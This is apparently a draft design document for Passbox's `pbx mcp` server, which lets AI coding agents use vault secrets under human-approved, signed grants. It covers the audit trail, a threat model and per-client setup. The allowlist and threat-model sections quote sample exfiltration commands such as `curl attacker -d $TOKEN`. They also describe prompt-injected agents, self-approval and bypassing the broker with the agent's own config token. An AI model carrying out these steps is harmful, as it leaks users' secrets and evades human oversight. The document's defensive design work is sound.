# AI agents: `pbx mcp`, grants and approvals

> **Draft.** Not reviewed by cryptographers and not audited. Formats may still change before the first release that ships them.

This document describes wave F7 as implemented, following the concept in docs/planning/ai-native.md (German; K1 agent access, K12 agent audit). Setup instructions for the agents are at the end.

## What it does

`pbx mcp` lets an AI agent (Claude Code, Claude Desktop, Cursor, VS Code, Codex, …) build, test and deploy with your secrets **without seeing them**:

- The agent can search items and sees **metadata**: IDs, titles, vaults, categories, website domains, login usernames, field names and `pbx://` references. Never passwords, other concealed or TOTP values, card numbers or notes.
- The agent can **use** secrets: run a command with secrets in its environment (`passbox_run`), or render a config file from a template (`passbox_inject`). Values go into the process or the file, never into a tool result. Command output is redacted.
- The agent can **save** a new secret (`passbox_create_item`), for example an API token it just created, by passing a file path or asking Passbox to generate a password. The value is not returned.
- **Every use needs a grant you approved on another device**: the Passbox web app or the desktop app (which shows the web app and asks for attention). There is no approval on the terminal.
- **Revealing a value is off by default** ([ADR 0006](../adr/0006-ai-principles.md)). `passbox_reveal` exists only with `pbx mcp --allow-reveal` and returns one value only when you tick "Allow revealing the value to the agent" for that grant, and only where the organization's policy allows it (see [Revealing a value](#revealing-a-value-passbox_reveal)).

## Components

```
agent ──MCP (stdio)──▶ pbx mcp (crates/cli/src/mcp.rs: protocol only)
                          │
                          ▼
                 agent broker (crates/client/src/agent: grants, tools, redaction, audit)
                          │  account session or service account token
                          ▼
                 passbox-server: /agent-grants (relay), /agent-events (audit)
                          ▲
                          │  signed decision (account Ed25519 key)
            Passbox web / desktop app on another signed-in device: approval dialog
```

- **`crates/core/src/agent_grant.rs`** holds only cryptography: the canonical grant request, the decision, and its signature and verification. No AI code is in the core.
- **The broker** (`passbox_client::agent`) decides: it resolves references, checks grants (items, action, allowlist, time limit, uses), asks the server for revocations before every use, runs commands, redacts output and reports every action. It works with the account on the machine or with a service account (`Backend` trait).
- **`pbx mcp`** translates MCP (JSON-RPC 2.0, newline-delimited, protocol versions 2025-06-18, 2025-03-26 and 2024-11-05) to broker calls. It is implemented directly (about 400 lines) to keep a dependency out of the path to secrets. Tool descriptions are fixed in the binary.
- **The server** relays requests and decisions and stores the audit trail (`agent_grants`, `agent_events`, migration `0011`). It never sees secret values.
- **The approving app** (web, `apps/web/src/developer`) shows pending requests, parses the exact request bytes with the WebAssembly core, and signs the decision.

## Grants

A grant request is a canonical object (see `agent_grant.rs`):

```
request  = canonical("passbox/v1/agent-grant-request", id, principal_kind (session|service), principal_id,
                     client_name, on_behalf_of, [(item_id, vault_id)], [action], [command], [path],
                     reason, ttl_ms, max_uses, created_at, nonce)
decision = canonical("passbox/v1/agent-grant-decision", object_hash(request), approved, not_after,
                     max_uses, approver_id, decided_at)
sig      = Ed25519(on_behalf_of's account signing key, decision)
```

- **Scope:** 1 to 50 named items, never "everything". Actions are `run`, `inject`, `create` and `reveal`. `run` needs an allowlist of commands; `inject` a list of output paths; `reveal` only works with the explicit tick described below.
- **Allowlist:** an entry is an exact command line (whitespace normalized) or a prefix ending in ` *`. A prefix never matches a command line containing `;`, `|`, `&`, `` ` ``, `$(`, `>`, `<` or a line break, so `terraform *` does not allow `terraform plan; curl evil -d $TOKEN`.
- **Per-use approval:** a command (or output path) that no grant allows makes the broker ask for a single-use grant naming exactly that command line, valid for 10 minutes.
- **Time limit:** 1 minute to 8 hours (default 1 hour), counted from the decision. Optional number of uses; the approver can lower it, never raise it. Grants live in the `pbx mcp` process and end when it exits.
- **Verification:** the broker accepts a decision only if it covers the hash of the request bytes it sent, is signed by the account the request was made for (the own account key for a signed-in session; for a service account, the owner's key from the service account's encrypted private part, not from the server) and does not exceed the request. The server checks the signature too, to keep garbage out.
- **Revocation:** the approving app can revoke a grant; the broker checks the grant's status with the server before every use and refuses when the server is unreachable (fail closed).
- **Approval code:** six digits from the request hash, shown in the tool result and in the dialog, so the person can match the request on screen with the agent's message.

## Revealing a value (`passbox_reveal`)

The one exception to "agents never see values" ([ADR 0006](../adr/0006-ai-principles.md)). Use it only when using the secret in a command or file is impossible, for example to paste it into a web form the agent drives.

```
decision (with tick) = canonical("passbox/v2/agent-grant-decision", object_hash(request), approved,
                                 not_after, max_uses, approver_id, decided_at, reveal_allowed = 1)
```

Layers, all of which must agree:

1. **Off in `pbx mcp`.** The tool is listed only with `pbx mcp --allow-reveal` (or `PASSBOX_MCP_ALLOW_REVEAL=1`), which the person sets in the agent's MCP configuration. Without it, `passbox_reveal` and `reveal` in `passbox_request_access` are refused.
2. **Per grant, explicit.** The agent's request names `reveal` and the item (`passbox_reveal` asks for a single-use grant for one field, valid 10 minutes; `passbox_request_access` can include `reveal` with other actions). The approval dialog shows a red section with a warning and an unticked checkbox "Allow revealing the value to the agent". Only a ticked approval is signed in the v2 decision format with `reveal_allowed`; an ordinary approval (v1) never allows a reveal, and `verify_decision` rejects a decision that allows revealing for a request that did not ask for it. The broker reveals only under a grant whose verified decision carries the tick.
3. **Organization policy.** `allowAgentReveal` (signed policy rule `allow_agent_reveal`, default **false**, also false for policies signed before the rule existed and for organizations without a policy) decides for the organization's vaults. Personal vaults need only the tick. Checked by the approving app's core (it refuses to sign the tick), by the broker (session principals verify the policy themselves; a service account cannot verify policies and relies on the next layer) and by the server (it refuses a decision with the tick for such vaults with 403 `policy_violation`).
4. **Logged before it happens.** The broker reports the `reveal` event and hands out the value only after the server accepted it. The server accepts a successful `reveal` only for an approved, unexpired grant of that principal whose signed decision allows revealing those items, and only if the policies allow it (403 `agent_reveal_not_allowed` otherwise). It appears as `agent_reveal` in the account's activity (marked as an alert in the web app) and in `agent_events`.

The value is returned once, with a note that it must not be repeated in answers, logs, commits or files. A revealed value cannot be taken back: the agent, its model provider and anything it sends the value to may keep it. Change the secret afterwards if it matters.

## Audit (K12)

Every action is recorded twice, never with values:

- **Server:** `agent_events` (principal, client name, grant, tool, item IDs, target, result) and an entry in the account's activity (`agent_grant_requested`, `agent_grant_approved`, `agent_grant_denied`, `agent_grant_revoked`, `agent_run`, `agent_inject`, `agent_create`, `agent_reveal`, `agent_request_access`). Searches are kept in `agent_events` only. The target of a command is its first word plus 16 hex digits of a hash of the whole command line, because command lines can contain data; the target of a reveal is `field:{field}`.
- **Locally:** `agent-audit.log` (JSON Lines, mode 0600) in the CLI data directory.

The web app's **Developer → Agent activity** lists both the grants and the events.

## Threat model

Assets: secret values in the vault; the integrity of what runs with them; the person's attention (approval fatigue).

| Threat | Mitigation | Residual risk |
| --- | --- | --- |
| **Prompt injection** makes the agent request or use a secret (text in an issue, a web page, a README, a vault item's notes) | Every use needs a human approval outside the agent's channel. The dialog shows the full command line, the items, the agent's reason (marked as the agent's words) and the client name. Allowlists are narrow by default; per-use approvals name one command. Tool results mark vault text as untrusted data. | A person can approve a malicious command they did not read. Keep allowlists short and read command lines. |
| **Exfiltration through command output** (`echo $TOKEN`, `env`, `base64`) | Output is redacted for every injected value as is, Base64 (standard/URL, with and without padding), hex and percent-encoded; long multi-line values also line by line; output is capped at 32 KB per stream. | Transformations the redactor does not know (reversed, compressed, split, partially printed) pass. Redaction is a safety net, not the boundary; the approval of the command is. |
| **Exfiltration through the network** (`curl attacker -d $TOKEN`) | The approval shows the command line; prefix allowlists cannot be extended with shell operators. | An allowed program can itself send data anywhere (for example a deploy script under the agent's control). A network allowlist or sandbox per grant is planned, not built. |
| **The agent reads the secret through the file system** after `passbox_inject` | `inject` needs approval per output path; files are written 0600. | The agent usually runs as the same user and can read the file. Use `run` when you can; inject only into paths the agent will not read. |
| **The agent answers its own approval** | No terminal prompt and no CLI approve command: decisions come only from the web or desktop app, signed with the account key; the server also refuses decisions from CLI sessions. With a service account token, `pbx mcp` holds no key that can sign an approval at all. | A compromised device that is signed in to your account can approve. Without a service account, `pbx mcp` unlocks your account with `PASSBOX_PASSWORD`, so a process that reads that password has your whole account, including the key that signs approvals: use a service account. |
| **A malicious or compromised server** approves, changes or replays requests | Decisions are signed by the account key and bound to the hash of the exact request bytes; the approving app displays what it parsed from those bytes; the broker verifies. | The server can withhold requests or decisions (denial of service) and sees metadata (who asked, when, which item IDs, client names). |
| **Agent reads credentials from disk** (MCP config with a token or `PASSBOX_PASSWORD`, `pbx` data directory) | `pbx mcp` scrubs `PASSBOX_PASSWORD`, `PASSBOX_SERVICE_ACCOUNT_TOKEN`, `PASSBOX_TWO_FACTOR_CODE` and `PASSBOX_SECRET_KEY` from every command it runs. Recommended setup: a dedicated service account with read access to one small vault, with an expiry. | An agent that can run arbitrary shell commands as your user can read its own MCP configuration and use the token directly with `pbx`, bypassing the broker. The token then gives exactly what the service account has: keep it small, set an expiry, and restrict the agent's file access (Claude Code permissions, sandboxing). Server-enforced approvals for agent principals are planned (K11). |
| **Approval fatigue** | Grants with an allowlist cover a task (default 1 hour); single-use grants for everything else; pending requests expire after 10 minutes; at most 10 pending per account and 30 requests per 10 minutes per principal. | People approve what they see often. |
| **Rug pull** (tool descriptions change to invite misuse) | Tool names, descriptions and schemas are compiled into `pbx`. | A malicious `pbx` build is out of scope; use signed releases. |
| **Malicious vault content** shared by others (titles, labels, tags) | Search results say that vault text is data, not instructions; notes are never returned. | Agents may still follow instructions in titles. |
| **Reveal abuse:** a prompt-injected agent asks to see a secret (`passbox_reveal`) to exfiltrate it | Off unless `pbx mcp --allow-reveal`; every reveal needs a fresh approval with an unticked-by-default checkbox and a red warning; the tick is a separate signed format the server and broker verify; organizations forbid it by default for their vaults (`allowAgentReveal` false); the server must accept the `reveal` event first; `agent_reveal` is an alert in the activity log. | A person who ticks the box gives the value away for good: the agent, its model provider and anything it calls can keep it. Prefer `run`/`inject`; rotate a revealed secret if it matters. With a service account, the policy is checked by the server and the approving app, not by the broker. |
| **A modified client or server ignores `allowAgentReveal`** | The approving app's core refuses to sign the tick for forbidden vaults; an honest broker never reveals without a verified tick. | A modified approving app could sign the tick anyway, and a modified broker on the agent's machine could skip every check; the server's refusal then only protects the audit trail. As for other policies, `allowAgentReveal` guards honest clients, it is not a cryptographic boundary. |

What `pbx mcp` deliberately does **not** do: return secret values to the agent unless reveal is turned on and ticked per grant, approve anything itself, read approvals from the terminal, keep grants after it exits, or call any AI model.

## Fair use: agents and service accounts are free

AI agents and service accounts never count as members. To prevent abuse, the hosted service limits active (neither revoked nor expired) service accounts with `PASSBOX_AGENT_LIMIT_PER_MEMBER` (hosted: 10 per paying member). An account on its own may have that many; members of an organization share a pool of the limit times the organization's confirmed members who are not guests (the organization with the most room counts). Self-hosting defaults to 0, unlimited; instance admins can set the limit in the admin console (Settings → "AI agents and service accounts per member"), which overrides the environment variable. Creating one more answers 403 `agent_limit_reached` with a message that names the limit; the web app shows "n of m used" in Developer → Service accounts. `GET /api/v1/agent-limit` returns the account's pool (`limitPerMember`, `used`, `allowed`, `pool`, `members`). Agents through a signed-in `pbx` session are the person themselves and are not counted.

## Setup

Recommended for every agent: create a service account (**Developer → Service accounts** in the web app) with **read** access to a vault that holds only what the agent needs, and an expiry. Install `pbx` (see [cli.md](https://github.com/passboxnet/cli/blob/main/docs/cli.md)). Keep the Passbox web or desktop app open and signed in on a device you are watching: that is where approvals appear.

Without a service account, `pbx mcp` uses the account signed in with `pbx signin` and needs `PASSBOX_PASSWORD` in its environment (it cannot prompt, standard input is the protocol). Prefer the service account: the master password in a configuration file is a much bigger key.

### Claude Code

```sh
claude mcp add passbox \
  --env PASSBOX_SERVER=https://passbox.example.com \
  --env PASSBOX_SERVICE_ACCOUNT_TOKEN=pbx_sa_… \
  -- pbx mcp
```

Use the user scope (default `local`, or `--scope user`), not a project `.mcp.json` that is committed. Consider denying the agent read access to `~/.claude.json` in your permission settings, since it contains the token.

### Claude Desktop

`claude_desktop_config.json` (Settings → Developer → Edit config):

```json
{
  "mcpServers": {
    "passbox": {
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "pbx_sa_…"
      }
    }
  }
}
```

Use the full path to `pbx` if it is not on the app's `PATH` (for example `/Users/you/.cargo/bin/pbx`).

### Cursor

`~/.cursor/mcp.json` (global; avoid the project file `.cursor/mcp.json` for tokens):

```json
{
  "mcpServers": {
    "passbox": {
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "pbx_sa_…"
      }
    }
  }
}
```

### VS Code (GitHub Copilot agent mode)

User `mcp.json` (Command Palette → "MCP: Open User Configuration"); the input keeps the token out of the file:

```json
{
  "inputs": [
    { "type": "promptString", "id": "passbox-token", "description": "Passbox service account token", "password": true }
  ],
  "servers": {
    "passbox": {
      "type": "stdio",
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "${input:passbox-token}"
      }
    }
  }
}
```

### Codex CLI and others

Any client that starts stdio MCP servers works the same way: command `pbx`, argument `mcp`, the two environment variables. For Codex, add to `~/.codex/config.toml`:

```toml
[mcp_servers.passbox]
command = "pbx"
args = ["mcp"]
env = { PASSBOX_SERVER = "https://passbox.example.com", PASSBOX_SERVICE_ACCOUNT_TOKEN = "pbx_sa_…" }
```

### Using it

Ask the agent, for example: "Run the database migrations against staging using the Staging DB credentials from Passbox." The agent searches, then calls `passbox_run` with `env: {"DATABASE_URL": "pbx://Agent/Staging DB/url"}`. Your Passbox app shows the request with its approval code; check the command line and approve. The agent receives the exit code and the redacted output.

For a series of commands, the agent can ask once with `passbox_request_access` and an allowlist such as `["npm run migrate *", "npm test"]` for an hour.

To let an agent see a value at all, add `--allow-reveal` to the arguments (`"args": ["mcp", "--allow-reveal"]`). Each `passbox_reveal` still needs your approval with the tick.

## Not yet built

- Approval on the phone and a native desktop dialog with biometrics (the desktop app shows the web dialog and asks for attention).
- Server-enforced approvals for agent principals (K11): today the broker enforces grants; the server enforces only the service account's vault access.
- Network allowlists or sandboxes per grant; browser autofill for agents (K2).
- Marking items as "used by an agent" in Watchtower.
